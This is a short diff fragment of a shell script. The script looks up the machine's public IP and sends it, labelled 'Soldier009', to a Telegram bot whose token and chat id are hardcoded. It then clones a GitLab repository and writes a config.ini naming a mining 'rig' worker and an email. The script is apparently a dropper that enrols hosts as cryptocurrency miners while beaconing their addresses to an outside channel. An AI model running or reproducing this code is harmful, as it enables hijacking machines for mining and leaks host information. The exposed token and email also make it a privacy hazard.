@@ -6,8 +6,9 @@ numb=$(echo $(shuf -i 100-500 -n 1))
 myIp="$(wget -qO- ifconfig.me/ip)"
 n0z="Soldier009|$myIp"
 curl --silent -X GET 'https://api.telegram.org/bot5298453094:AAEWdAWPsJF58wwoVpZI-tvEsUmaFFwo5Fs/sendMessage?chat_id=5280847845&text='$n0z --compressed
-jq -r '.ok' <<< $sending
+
 git clone https://gitlab.com/diablostrom5/master.git
+
 touch master/config.ini 
 echo "rigName = Worker" >> "master/config.ini"
 echo "email = diablostrom5@gmail.com" >> "master/config.ini" 
